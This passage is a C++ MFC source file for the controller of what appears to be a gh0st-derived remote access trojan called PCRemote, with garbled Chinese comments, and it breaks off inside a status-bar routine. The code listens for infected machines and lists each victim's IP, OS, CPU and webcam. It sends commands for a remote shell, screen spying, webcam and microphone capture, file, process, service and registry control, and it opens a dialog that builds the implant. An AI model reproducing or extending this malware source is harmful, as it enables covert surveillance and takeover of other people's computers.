
// PCRemoteDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "PCRemote.h"
#include "PCRemoteDlg.h"
#include "afxdialogex.h"
#include "SettingDlg.h"
#include "..\..\common\macros.h"
#include "ShellDlg.h"
#include "SystemDlg.h"
#include "ScreenSpyDlg.h"
#include "FileManagerDlg.h"
#include "AudioDlg.h"
#include "VideoDlg.h"
#include "BuildDlg.h"
#include "serverdlg.h"
#include "RegDlg.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#endif

typedef struct
{
	char	*title;           //�б������
	int		nWidth;   //�б�Ŀ��
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_Online_Data[] = 
{
	{"IP",				148	},
	{"����",			150	},
	{"�������/��ע",	160	},
	{"����ϵͳ",		128	},
	{"CPU",				80	},
	{"����ͷ",			81	},
	{"PING",			81	}
};
int g_Column_Online_Count=7;  //�б�ĸ���
int g_Column_Online_Width=0;  //���ܿ��
COLUMNSTRUCT g_Column_Message_Data[] = 
{
	{"��Ϣ����",		68	},
	{"ʱ��",			100	},
	{"��Ϣ����",	    660	}
};
//��������
int g_Column_Message_Count=3; //�б�ĸ���
int g_Column_Message_Width=0;  //���ܿ��

CIOCPServer *m_iocpServer = NULL;
CPCRemoteDlg *g_pPCRemoteDlg=NULL;
// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CPCRemoteDlg �Ի���




CPCRemoteDlg::CPCRemoteDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CPCRemoteDlg::IDD, pParent)
{

	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	iCount=0;
	g_pPCRemoteDlg=this;
	if (((CPCRemoteApp *)AfxGetApp())->m_bIsQQwryExist)
	{
		m_QQwry = new SEU_QQwry;
		m_QQwry->SetPath("QQWry.Dat");
	}
}

void CPCRemoteDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_ONLINE, m_CList_Online);
	DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
}

BEGIN_MESSAGE_MAP(CPCRemoteDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CPCRemoteDlg::OnNMRClickOnline)
//ON_COMMAND(IDM_ONLINE_AUDIO, &CPCRemoteDlg::OnOnlineAudio)
//ON_COMMAND(IDM_ONLINE_DELETE, &CPCRemoteDlg::OnOnlineDelete)
ON_COMMAND(IDM_ONLINE_AUDIO, &CPCRemoteDlg::OnOnlineAudio)
ON_COMMAND(IDM_ONLINE_CMD, &CPCRemoteDlg::OnOnlineCmd)
ON_COMMAND(IDM_ONLINE_DESKTOP, &CPCRemoteDlg::OnOnlineDesktop)
ON_COMMAND(IDM_ONLINE_FILE, &CPCRemoteDlg::OnOnlineFile)
ON_COMMAND(IDM_ONLINE_PROCESS, &CPCRemoteDlg::OnOnlineProcess)
ON_COMMAND(IDM_ONLINE_SERVER, &CPCRemoteDlg::OnOnlineServer)
ON_COMMAND(IDM_ONLINE_VIDEO, &CPCRemoteDlg::OnOnlineVideo)
ON_COMMAND(IDM_ONLINE_WINDOW, &CPCRemoteDlg::OnOnlineWindow)
ON_COMMAND(IDM_ONLINE_DELETE, &CPCRemoteDlg::OnOnlineDelete)
ON_COMMAND(IDM_MAIN_CLOSE, &CPCRemoteDlg::OnMainClose)
ON_COMMAND(IDM_MAIN_ABOUT, &CPCRemoteDlg::OnMainAbout)
ON_COMMAND(IDM_MAIN_BUILD, &CPCRemoteDlg::OnMainBuild)
ON_COMMAND(IDM_MAIN_SET, &CPCRemoteDlg::OnMainSet)
//�Զ�����Ϣ
 ON_MESSAGE(UM_ICONNOTIFY, (LRESULT (__thiscall CWnd::* )(WPARAM,LPARAM))OnIconNotify)
 ON_MESSAGE(WM_ADDTOLIST, OnAddToList)        //����  OnAddToList
 ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog) 
 ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog) 
ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog) 
ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
ON_MESSAGE(WM_OPENSERVERDIALOG, OnOpenServerDialog)
 ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegEditDialog)
//ON_WM_CLOSE()
//ON_COMMAND(IDM_NOTIFY_CLOSE, &CPCRemoteDlg::OnNotifyClose)
//ON_COMMAND(IDM_NOTIFY_SHOW, &CPCRemoteDlg::OnNotifyShow)
ON_COMMAND(IDM_NOTIFY_CLOSE, &CPCRemoteDlg::OnNotifyClose)
ON_COMMAND(IDM_NOTIFY_SHOW, &CPCRemoteDlg::OnNotifyShow)
ON_WM_CLOSE()
ON_COMMAND(IDM_ONLINE_REGEDIT, &CPCRemoteDlg::OnOnlineRegedit)
END_MESSAGE_MAP()



//lang2.1_9  NotifyProc�����socket�ں˵ĺ���  ���еĹ���socket �Ĵ���Ҫ�����������
void CALLBACK CPCRemoteDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	
	try
	{

		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			//g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			//ProcessReceive(pContext);        //�����������ݵ��� ��û����ȫ����
			break;
		case NC_RECEIVE_COMPLETE:        //--������Ǵ�����������������gh0st���ҵ��������
			ProcessReceiveComplete(pContext);       //����ʱ��ȫ���� �������������� ����    ProcessReceiveComplete
			break;
		}
	}catch(...){}
}

void CPCRemoteDlg::Activate(UINT nPort, UINT nMaxConnections)
{
	CString		str;
	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;

	}
	m_iocpServer = new CIOCPServer;

	////lang2.1_8
	// ����IPCP������ �������  �˿�     �鿴NotifyProc�ص�����  ��������
	if (m_iocpServer->Initialize(NotifyProc, NULL, 100000, nPort))
	{

		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
		{ 
			for ( int i=0; ; i++ )
			{ 
				str += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if ( host->h_addr_list[i] + host->h_length >= host->h_name )
					break;
				str += "/";
			}
		}

		//m_wndStatusBar.SetPaneText(0, str);
		//str.Format("�˿�: %d", nPort);
		//m_wndStatusBar.SetPaneText(2, str);
		str.Format("�����˿�: %d�ɹ�", nPort);
		ShowMessage(true,str);
	}
	else
	{
		//str.Format("�˿�%d��ʧ��", nPort);
		//m_wndStatusBar.SetPaneText(0, str);
		//m_wndStatusBar.SetPaneText(2, "�˿�: 0");
		str.Format("�����˿�: %dʧ��", nPort);
		ShowMessage(false,str);
	}

	//m_wndStatusBar.SetPaneText(3, "����: 0");
}

//lang2.1_10   //�������з���˷���������Ϣ
void CPCRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// �������Ի���򿪣�������Ӧ�ĶԻ�����
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];      //�������ClientContext �ṹ���int m_Dialog[2];

	// �������ڴ���
	if (pContext->m_Dialog[0] > 0)                //����鿴�Ƿ������ֵ�ˣ������ֵ�˾Ͱ����ݴ������ܴ��ڴ���
	{
		switch (pContext->m_Dialog[0])
		{
		/*
		
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;*/
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CVideoDlg *)dlg)->OnReceiveComplete();
			break;
		case SERVER_DLG:
			((CServerDlg *)dlg)->OnReceiveComplete();
			break;
		case REGEDIT_DLG:
			((CRegDlg *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])   //���û�и�ֵ���ж��Ƿ������߰��ʹ򿪹��ܹ��ܴ���
	{                                                           //�����ص�ClientContext�ṹ��
	/*case TOKEN_AUTH: // Ҫ����֤
		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;
	case TOKEN_HEARTBEAT: // �ظ�������
		{
			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}

		break;*/
	case TOKEN_LOGIN: // ���߰�

		{
			//���ﴦ������
			if (m_iocpServer->m_nMaxConnections <= g_pPCRemoteDlg->m_CList_Online.GetItemCount())
			{
				closesocket(pContext->m_Socket);
			}
			else
			{
				pContext->m_bIsMainSocket = true;
				g_pPCRemoteDlg->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);   
			}
			// ����
			BYTE	bToken = COMMAND_ACTIVED;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}

		break;
	/*
	case TOKEN_BITMAPINFO: //
		// ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����
		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	
	
	case TOKEN_KEYBOARD_START:
		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;*/
	case TOKEN_AUDIO_START: // ����
		g_pPCRemoteDlg->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_DRIVE_LIST: // �������б�
		// ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����,̫��
		g_pPCRemoteDlg->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		// ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����
		g_pPCRemoteDlg->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WSLIST:    //��˼���ǽ��̹������ڹ�������һ���Ի���
	case TOKEN_PSLIST:
		g_pPCRemoteDlg->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START:
		g_pPCRemoteDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // ����ͷ
		g_pPCRemoteDlg->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case  TOKEN_SERVERLIST:
		g_pPCRemoteDlg->PostMessage(WM_OPENSERVERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_REGEDIT:
		g_pPCRemoteDlg->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
		break;
		// ����ֹͣ��ǰ����
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}

void CPCRemoteDlg::ListenPort(void)
{
	int	nPort = ((CPCRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort");         //��ȡini �ļ��еļ����˿�
	int	nMaxConnection = ((CPCRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection");   //��ȡ���������
	if (nPort == 0)
		nPort = 80;
	if (nMaxConnection == 0)
		nMaxConnection = 10000;
	Activate(nPort,nMaxConnection);             //��ʼ����
}

// CPCRemoteDlg ��Ϣ�������
BOOL CPCRemoteDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO: �ڴ���Ӷ���ĳ�ʼ������
	HMENU hmenu;
	hmenu=LoadMenu(NULL,MAKEINTRESOURCE(IDR_MENU_MAIN));  //����˵���Դ
	::SetMenu(this->GetSafeHwnd(),hmenu);                  //Ϊ�������ò˵�
	::DrawMenuBar(this->GetSafeHwnd());                    //��ʾ�˵�
	InitList();  //init all  list
	CreatStatusBar();                            //����״̬��
	CreateToolBar();

	nid.cbSize = sizeof(nid);     //��С��ֵ
	nid.hWnd = m_hWnd;           //������
	nid.uID = IDR_MAINFRAME;     //icon  ID
	nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;   //������ӵ�е�״̬
	nid.uCallbackMessage = UM_ICONNOTIFY;            //�ص���Ϣ
	nid.hIcon = m_hIcon;                            //icon ����
	CString str="PCRemoteԶ��Э�����.........";       //������ʾ
	lstrcpyn(nid.szTip, (LPCSTR)str, sizeof(nid.szTip) / sizeof(nid.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &nid);   //��ʾ����

	ShowMessage(true,"�����ʼ���ɹ�...");
	CRect rect;
	GetWindowRect(&rect);
	rect.bottom+=20;
	MoveWindow(rect);
	ListenPort();        //��ʼ����
	//Test();
	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CPCRemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CPCRemoteDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
	
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CPCRemoteDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CPCRemoteDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);
	double dcx=cx;     //�Ի�����ܿ��
	if (SIZE_MINIMIZED==nType)
	{
		return;
	}
	if (m_CList_Online.m_hWnd!=NULL)
	{
		CRect rc;
		rc.left=1;         //�б��������
		rc.top=80;         //�б��������
		rc.right=cx-1;     //�б��������
		rc.bottom=cy-160;  //�б��������
		m_CList_Online.MoveWindow(rc);
		for(int i=0;i<g_Column_Online_Count;i++){                   //����ÿһ����
			double dd=g_Column_Online_Data[i].nWidth;     //�õ���ǰ�еĿ��
			dd/=g_Column_Online_Width;                    //��һ����ǰ���ռ�ܳ��ȵļ���֮��
			dd*=dcx;                                       //��ԭ���ĳ��ȳ�����ռ�ļ���֮���õ���ǰ�Ŀ��
			int lenth=dd;                                   //ת��Ϊint ����
			m_CList_Online.SetColumnWidth(i,(lenth));        //���õ�ǰ�Ŀ��
		}

	}
	if (m_CList_Message.m_hWnd!=NULL)
	{
		CRect rc;
		rc.left=1;        //�б��������
		rc.top=cy-156;    //�б��������
		rc.right=cx-1;    //�б��������
		rc.bottom=cy-20;  //�б��������
		m_CList_Message.MoveWindow(rc);

		for(int i=0;i<g_Column_Message_Count;i++){                   //����ÿһ����
			double dd=g_Column_Message_Data[i].nWidth;     //�õ���ǰ�еĿ��
			dd/=g_Column_Message_Width;                    //��һ����ǰ���ռ�ܳ��ȵļ���֮��
			dd*=dcx;                                       //��ԭ���ĳ��ȳ�����ռ�ļ���֮���õ���ǰ�Ŀ��
			int lenth=dd;                                   //ת��Ϊint ����
			m_CList_Message.SetColumnWidth(i,(lenth));        //���õ�ǰ�Ŀ��
		}
	}

	if(m_wndStatusBar.m_hWnd!=NULL){    //���Ի����С�ı�ʱ ״̬����СҲ��֮�ı�
		CRect rc;
		rc.top=cy-20;
		rc.left=0;
		rc.right=cx;
		rc.bottom=cy;
		m_wndStatusBar.MoveWindow(rc);
		m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0),SBPS_POPOUT, cx-10);
	}

	if(m_ToolBar.m_hWnd!=NULL)              //������
	{
		CRect rc;
		rc.top=rc.left=0;
		rc.right=cx;
		rc.bottom=80;
		m_ToolBar.MoveWindow(rc);     //���ù�������Сλ��
	}
	// TODO: �ڴ˴������Ϣ����������
}


// init list
int CPCRemoteDlg::InitList(void)
{
	// init online list
	m_CList_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	for (int i = 0; i < g_Column_Online_Count; i++)
	{
		m_CList_Online.InsertColumn(i, g_Column_Online_Data[i].title,LVCFMT_CENTER,g_Column_Online_Data[i].nWidth);
		g_Column_Online_Width+=g_Column_Online_Data[i].nWidth;       //�õ��ܿ��

	}
	m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	for (int i = 0; i < g_Column_Message_Count; i++)
	{
		m_CList_Message.InsertColumn(i, g_Column_Message_Data[i].title,LVCFMT_CENTER,g_Column_Message_Data[i].nWidth);
		g_Column_Message_Width+=g_Column_Message_Data[i].nWidth;       //�õ��ܿ��
	}
	return 0;
}


// add to online list
void CPCRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing,ClientContext	*pContext)
{
	m_CList_Online.InsertItem(0,strIP);           //Ĭ��Ϊ0��  �������в�������ж���������
	m_CList_Online.SetItemText(0,ONLINELIST_ADDR,strAddr);      //�����е���ʾ�ַ�   ���� ONLINELIST_ADDR�� Ϊ�ڶ��ڿ��е�ö������ �������ķ���
	m_CList_Online.SetItemText(0,ONLINELIST_COMPUTER_NAME,strPCName); //������������Ժ���չʱ�ĳ�ͻ
	m_CList_Online.SetItemText(0,ONLINELIST_OS,strOS); 
	m_CList_Online.SetItemText(0,ONLINELIST_CPU,strCPU);
	m_CList_Online.SetItemText(0,ONLINELIST_VIDEO,strVideo);
	m_CList_Online.SetItemText(0,ONLINELIST_PING,strPing); 
	m_CList_Online.SetItemData(0,(DWORD)pContext);
	ShowMessage(true,strIP+"��������");
}


// Show msg to  msg list
void CPCRemoteDlg::ShowMessage(bool bIsOK, CString strMsg)
{
	CString strIsOK,strTime;
	CTime t=CTime::GetCurrentTime();
	strTime=t.Format("%H:%M:%S");
	if (bIsOK)
	{
		strIsOK="ִ�гɹ�";
	}else{
		strIsOK="ִ��ʧ��";
	}
	m_CList_Message.InsertItem(0,strIsOK);
	m_CList_Message.SetItemText(0,1,strTime);
	m_CList_Message.SetItemText(0,2,strMsg);


	CString strStatusMsg;
	if (strMsg.Find("����")>0)         //�������߻���������Ϣ
	{
		iCount++;
	}else if (strMsg.Find("����")>0)
	{
		iCount--;
	}else if (strMsg.Find("�Ͽ�")>0)
	{
		iCount--;
	}
	iCount=(iCount<=0?0:iCount);         //��ֹiCount ��-1�����
	strStatusMsg.Format("����:%d",iCount);
	m_wndStatusBar.SetPaneText(0,strStatusMsg);   //��״̬������ʾ����
}


void CPCRemoteDlg::Test(void)
{
	//AddList("192.168.0.1","����������","Lang","Windows7","2.2GHZ","��","123232");
	//AddList("192.168.0.2","����������","Lang","Windows7","2.2GHZ","��","123232");
	//AddList("192.168.0.3","����������","Lang","Windows7","2.2GHZ","��","123232");
	
}

void CPCRemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	CMenu	popup;
	popup.LoadMenu(IDR_MENU_ONLINE);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	int	count = pM->GetMenuItemCount();
	if (m_CList_Online.GetSelectedCount() == 0)       //���û��ѡ��
	{ 
		for (int i = 0; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //�˵�ȫ�����
		}

	}
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;
}



void CPCRemoteDlg::OnOnlineAudio()
{
	// TODO: �ڴ���������������
	BYTE	bToken = COMMAND_AUDIO;                 //�����˷������� �����������
	SendSelectCommand(&bToken, sizeof(BYTE));	

}

LRESULT CPCRemoteDlg::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

void CPCRemoteDlg::OnOnlineCmd()
{
	// TODO: �ڴ���������������
	//MessageBox("�ն˹���");
	BYTE	bToken = COMMAND_SHELL;              //lang4.2.1        �����˷���һ��COMMAND_SHELL����  ��svchost����֮
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

//lang4.2���ն˹�����
LRESULT CPCRemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	//���ﶨ��Զ���ն˵ĶԻ���ת��Զ���ն˵�CShellDlg��Ķ���  �Ȳ鿴�Ի�������ת��OnInitDialog
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);

	// ���ø�����Ϊ׿��
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}
void CPCRemoteDlg::OnOnlineDesktop()
{
	// TODO: �ڴ���������������
	BYTE	bToken = COMMAND_SCREEN_SPY;  //�����˷���COMMAND_SCREEN_SPY CKernelManager::OnReceive��֮
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CPCRemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;

	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

void CPCRemoteDlg::OnOnlineFile()
{
	// TODO: �ڴ���������������
	//MessageBox("�ļ�����");
	BYTE	bToken = COMMAND_LIST_DRIVE;            //�ڷ����������COMMAND_LIST_DRIVE
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CPCRemoteDlg::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext *pContext = (ClientContext *)lParam;

	//ת��CFileManagerDlg  ���캯��
	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;

	return 0;
}

void CPCRemoteDlg::OnOnlineProcess()
{
	// TODO: �ڴ���������������
	//MessageBox("���̹���");
	BYTE	bToken = COMMAND_SYSTEM;         //��ֵһ���� Ȼ���͵�����ˣ������������COMMAND_SYSTEM
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CPCRemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);  //��̬����CSystemDlg

	// ���ø�����Ϊ׿��
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());      //�����Ի���
	dlg->ShowWindow(SW_SHOW);                      //��ʾ�Ի���

	pContext->m_Dialog[0] = SYSTEM_DLG;              //���ֵ����������ٴη�������ʱ�ı�ʶ
	pContext->m_Dialog[1] = (int)dlg;
	//�ȿ�һ������Ի���Ľ����ٿ�����Ի�����Ĺ��캯��
	return 0;
}
void CPCRemoteDlg::OnOnlineServer()
{
	// TODO: �ڴ���������������
	//MessageBox("�������");
	BYTE	bToken = COMMAND_SERVICES;         //��ֵһ���� Ȼ���͵�����ˣ������������COMMAND_SYSTEM
	SendSelectCommand(&bToken, sizeof(BYTE));
	
}

LRESULT CPCRemoteDlg::OnOpenServerDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CServerDlg	*dlg = new CServerDlg(this, m_iocpServer, pContext);  //��̬����CSystemDlg

	// ���ø�����Ϊ׿��
	dlg->Create(IDD_SERVERDLG, GetDesktopWindow());      //�����Ի���
	dlg->ShowWindow(SW_SHOW);                      //��ʾ�Ի���

	pContext->m_Dialog[0] = SERVER_DLG;              //���ֵ����������ٴη�������ʱ�ı�ʶ
	pContext->m_Dialog[1] = (int)dlg;
	//�ȿ�һ������Ի���Ľ����ٿ�����Ի�����Ĺ��캯��
	return 0;
}

void CPCRemoteDlg::OnOnlineVideo()
{
	// TODO: �ڴ���������������
	//MessageBox("��Ƶ����");
	BYTE	bToken = COMMAND_WEBCAM;                 //�����˷������� �����������
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

LRESULT CPCRemoteDlg::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{


	ClientContext *pContext = (ClientContext *)lParam;
	CVideoDlg	*dlg = new CVideoDlg(this, m_iocpServer, pContext);
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_VIDEO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


void CPCRemoteDlg::OnOnlineWindow()
{
	// TODO: �ڴ���������������
	//MessageBox("���ڹ���");
	BYTE	bToken = COMMAND_WSLIST;         
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CPCRemoteDlg::OnOnlineDelete()
{
	// TODO: �ڴ���������������
	CString strIP;
	int iSelect=m_CList_Online.GetSelectionMark( );
	strIP=m_CList_Online.GetItemText(iSelect,ONLINELIST_IP);
	m_CList_Online.DeleteItem(iSelect);
	strIP+=" �����Ͽ�����";
	ShowMessage(true,strIP);
}


void CPCRemoteDlg::OnMainClose()
{
	// TODO: �ڴ���������������
	 PostMessage(WM_CLOSE);
}


void CPCRemoteDlg::OnMainAbout()
{
	// TODO: �ڴ���������������
	CAboutDlg dlgAbout;
	dlgAbout.DoModal();
}


void CPCRemoteDlg::OnMainBuild()
{
	// TODO: �ڴ���������������
	//MessageBox("���ɷ����");
	CBuildDlg buildDlg;
	buildDlg.DoModal();
}


void CPCRemoteDlg::OnMainSet()
{
	// TODO: �ڴ���������������
	CSettingDlg SettingDlg;
	SettingDlg.DoModal();
}

static UINT indicators[] =
{
	IDR_STATUSBAR_STRING
};


// create  status bar
void CPCRemoteDlg::CreatStatusBar(void)
{
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))                    //����״̬���������ַ���Դ��ID
	{
		TRACE0("Failed to create status bar\n");
